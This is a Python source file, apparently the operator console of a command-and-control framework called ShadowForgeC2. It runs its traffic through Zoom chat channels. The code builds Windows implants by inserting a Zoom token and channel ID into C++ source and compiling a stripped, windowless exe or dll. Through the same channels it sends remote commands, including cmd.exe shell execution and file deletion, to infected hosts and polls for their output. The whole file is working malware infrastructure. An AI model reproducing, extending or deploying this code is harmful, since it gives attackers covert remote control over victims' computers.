import os
import readline
import subprocess
import sys
import threading
import time
from os import system
from .Messages import *
from termcolor import colored
import prettytable
from .ManageDatabase import ManageDatabase
from .ZoomAPI import ZoomAPI


DB = ManageDatabase()
DB.ConnectDatabase()
DB.CreateChannelTable()

ChannelCommands = ['getuid', 'getprivs', 'ps', 'cd', 'pwd', 'ls', 'shell', 'cp', 'mkdir', 'rm', 'exit', 'home', 'help']
threads = {}


def CommandsCompleter(text, state):
    options_matching_text = [ChannelCommand for ChannelCommand in ChannelCommands if ChannelCommand.startswith(text)]
    if state < len(options_matching_text):
        return options_matching_text[state]
    else:
        return None


def completer(text, state):
    option1 = ['help', 'home', 'exit', 'channel', 'generate', 'interact', 'allchannels', 'clear']
    option2 = ['exe', 'dll', 'list', 'delete']

    args = readline.get_line_buffer().split(' ')
    if len(args) == 1:
        options = [arg for arg in option1 if arg.startswith(text)]
    elif len(args) == 2:
        options = [arg for arg in option2 if arg.startswith(text)]
    else:
        options = []

    if state < len(options):
        return options[state]
    else:
        return None


class Menu:
    @staticmethod
    def clearScreen():
        system("clear")

    def __init__(self, name):
        self.name = name
        self.commands = []
        self.commands.append(["help", "Show help.", ""])
        self.commands.append(["home", "Return home.", ""])
        self.commands.append(["exit", "Exit.", ""])

    def RegisterCommand(self, command, description, args):
        self.commands.append([command, description, args])

    def ShowHelp(self):
        success("Available commands: ")

        t = prettytable.PrettyTable(
            [colored('Command', 'blue'), colored('Argument', 'blue'), colored('Help', 'blue')], padding_width=1, left_padding_width=3, align='l')
        t.set_style(prettytable.SINGLE_BORDER)

        for i in self.commands:
            if i[2] == "":
                t.add_row([f"{colored(i[0], 'yellow')}", colored(f"-", 'green'), f"{colored(i[1], 'green')}"])
            else:
                t.add_row([f"{colored(i[0], 'yellow')}", f"{colored(i[2], 'green')}", f"{colored(i[1], 'green')}"])

        print(t)


    def ParseArguments(self, mode):
        if mode == 0:
            readline.set_completer(completer)
            readline.parse_and_bind('tab: complete')
        else:
            readline.set_completer(CommandsCompleter)
            readline.parse_and_bind('tab: complete')
        cmd = input(prompt(self.name))
        cmd = cmd.split()
        command = cmd[0]
        args = []
        for i in range(1, len(cmd)):
            args.append(cmd[i])
        return command, args


MainMenu = Menu("ShadowForgeC2")
MainMenu.RegisterCommand("allchannels", "Get All Channels.", "")
MainMenu.RegisterCommand("channel", "List channel/delete a Channel.", "list/delete <CHANNEL_NAME>")
MainMenu.RegisterCommand("generate", "Generate Implant.", "<FILE_TYPE> <CHANNEL_NAME>")
MainMenu.RegisterCommand("interact", "Interact With Channel.", "<CHANNEL_NAME>")
MainMenu.RegisterCommand("clear", "Clearn the screen.", "")
HomeCommandsHelp = MainMenu.commands


def ShadowForgeHome():
    if not os.path.exists("dist/"):
        os.mkdir("dist/")
    MainMenu.clearScreen()
    while True:
        try:
            command, args = MainMenu.ParseArguments(0)
        except:
            continue
        commands = []
        for i in HomeCommandsHelp:
            commands.append(i[0])
        if command not in commands:
            error("Invalid command.")
        else:
            if command == "help":
                MainMenu.ShowHelp()
            elif command == "clear":
                os.system("clear")
            elif command == "allchannels":
                GetAllChannels()
            elif command == "channel":
                try:
                    if args[0] == "list":
                        ListChannels(args[1])
                    elif args[0] == "delete":
                        DeleteChannels(args[1])
                except IndexError:
                    error("Please Provide Arguments")
            elif command == "generate":
                try:
                    GenerateImplant(args[0], args[1])
                except IndexError:
                    error("Provide Arguments")
            elif command == "interact":
                try:
                    InteractChannel(args[0])
                except IndexError:
                    error("Provide Arguments!")
            elif command == "home":
                ShadowForgeHome()
            elif command == "exit":
                sys.exit()


def ListChannels(Channel_Name):
    channel = DB.QueryChannel(Channel_Name)
    if channel is None:
        error("Channel Not Found")
        return
    t = prettytable.PrettyTable(
        [colored('Channel Name', 'blue'), colored('Token', 'blue'),
         colored('Channel ID', 'blue')],
        padding_width=1,
        left_padding_width=3, align='l')
    t.set_style(prettytable.SINGLE_BORDER)
    t.add_row([colored(channel[1], 'green'),
               colored(f"{channel[2][:3]}...{channel[2][-7:]}", 'green'),
               colored(f"{channel[3][:3]}...{channel[3][-7:]}", "green")])
    print(t)


def GetAllChannels():
    t = prettytable.PrettyTable(
        [colored('Channel Name', 'blue'), colored('Token', 'blue'),
         colored('Channel ID', 'blue')],
        padding_width=1,
        left_padding_width=3, align='l')
    t.set_style(prettytable.SINGLE_BORDER)
    AllChannels = DB.QueryAllChannels()
    for channel in AllChannels:
        t.add_row([colored(channel[1], 'green'),
                   colored(f"{channel[2][:3]}...{channel[2][-7:]}", 'green'),
                   colored(f"{channel[3][:3]}...{channel[3][-7:]}", "green")])

    print(t)


def DeleteChannels(ChannelName):
    try:
        DB.DeleteChannel(ChannelName)
        success("Channel Deleted!")
    except Exception as e:
        error(f"Cannot Delete Channel: {e}")


def GenerateImplant(FileType, ChannelName):
    Server = ZoomAPI()
    token = Server.GenerateToken()
    ChannelId = Server.CreateChannel(token, ChannelName)
    if "Failed to create channel" in ChannelId:
        error(ChannelId)
        return
    else:
        DB.AddChannel(ChannelName, token, ChannelId)
        with open("TeamServer/src/SendRecv_main.cpp", "r") as SendRecv:
            SendRecvCode = SendRecv.read()
            SendRecv.close()

        SendRecvCode = SendRecvCode.replace("TOKEN", token)
        SendRecvCode = SendRecvCode.replace("CHANNEL_ID", ChannelId)
        with open("TeamServer/src/SendRecv.cpp", "w") as MainSendRecv:
            MainSendRecv.write(SendRecvCode)
            MainSendRecv.close()
    if FileType == "exe":
        compile_command = f"""x86_64-w64-mingw32-g++ TeamServer/src/main.cpp TeamServer/src/ReplaceWebStuff.cpp TeamServer/src/encoding.h TeamServer/src/cd_pwd_ls.cpp TeamServer/src/getuid_getprivs_ps.cpp TeamServer/src/cmd_powershell.cpp TeamServer/src/cp_mkdir_rm.cpp TeamServer/src/SendRecv.cpp -s -w -lwininet -lsecur32 -lpsapi -static -mwindows -o dist/{ChannelName}.exe"""
    elif FileType == "dll":
        compile_command = f"""x86_64-w64-mingw32-g++ TeamServer/src/main.cpp TeamServer/src/ReplaceWebStuff.cpp TeamServer/src/encoding.h TeamServer/src/cd_pwd_ls.cpp TeamServer/src/getuid_getprivs_ps.cpp TeamServer/src/cmd_powershell.cpp TeamServer/src/cp_mkdir_rm.cpp TeamServer/src/SendRecv.cpp -s -w -lwininet -lsecur32 -lpsapi -static -mwindows -shared -o dist/{ChannelName}.dll"""
    else:
        error("Unknown File Type")
        return
    p1 = subprocess.Popen(compile_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = p1.communicate()
    if len(err.decode()) != 0:
        compile_error = f"Something went wrong while Compiling binary, {err.decode()}"
        error(compile_error)
    else:
        success(f"Binary Compiled and stored in dist/{ChannelName}.{FileType}")
        system("rm TeamServer/src/SendRecv.cpp")


def InteractChannel(CHANNEL_NAME):
    ChannelData = DB.QueryChannel(CHANNEL_NAME)
    if ChannelData is None:
        error("No Channel Found")
    else:
        InteractChannelMenu = Menu(CHANNEL_NAME)
        InteractChannelMenu.RegisterCommand("getuid", "Get Current UID.", "")
        InteractChannelMenu.RegisterCommand("getprivs", "Get Current Privileges.", "")
        InteractChannelMenu.RegisterCommand("ps", "Get List Of Process RUnning.", "")
        InteractChannelMenu.RegisterCommand("cd", "Change Directory.", "<DIRECTORY>")
        InteractChannelMenu.RegisterCommand("pwd", "Get Current Working Directory.", "")
        InteractChannelMenu.RegisterCommand("ls", "List Directory.", "OPTIONAL: <DIRECTORY>")
        InteractChannelMenu.RegisterCommand("shell", "Execute Shell Command cmd.exe.", "<COMMAND>")
        InteractChannelMenu.RegisterCommand("rm", "Remove a Directory/File.", "<DIRECTORY/FILE>")
        InteractChannelMenu.RegisterCommand("mkdir", "Make a New Directory.", "<NEW_DIRECTORY>")
        InteractChannelMenu.RegisterCommand("cp", "Copy a file", "<FILE> <NEW_FILE>")
        InteractChannelMenuHelp = InteractChannelMenu.commands

        InteractChannelMenu.clearScreen()
        while True:
            try:
                command, args = InteractChannelMenu.ParseArguments(1)
            except:
                continue
            if command == "home":
                ShadowForgeHome()
            elif command == "help":
                InteractChannelMenu.ShowHelp()
            elif command not in ChannelCommands:
                error("Invalid command.")
            else:
                ChannelID = ChannelData[3]
                Token = ChannelData[2]
                SendCommand(ChannelID, Token, command, args)


def SendCommand(ChannelID, Token, command, args):
    global threads
    server = ZoomAPI()
    MessageID, Message = server.RecvMessage(Token, ChannelID)
    if Message is None:
        error(MessageID)
    elif Message == "Command already In Queue":
        error(Message)
    else:
        MainCommand = ""
        MainCommand += command
        for arg in args:
            MainCommand += " "
            MainCommand += arg
        result = server.UpdateMessage(Token, ChannelID, MessageID, MainCommand)
        if result == "Message Updated!":
            success("Commando Sent!")
            ChannelName = DB.QueryChannelByID(ChannelID)
            try:
                if threads[ChannelName[0]] is not True:
                    t = threading.Thread(target=GetOutput, args=(Token, ChannelID,))
                    t.daemon = True
                    t.start()
                else:
                    pass
            except KeyError:
                t = threading.Thread(target=GetOutput, args=(Token, ChannelID,))
                t.daemon = True
                t.start()
        else:
            error(result)


def GetOutput(Token, ChannelID):
    global threads
    ChannelName = DB.QueryChannelByID(ChannelID)
    threads = dict({ChannelName[0]: True})
    while True:
        time.sleep(12)
        server = ZoomAPI()
        server.RecvMessage(Token, ChannelID)
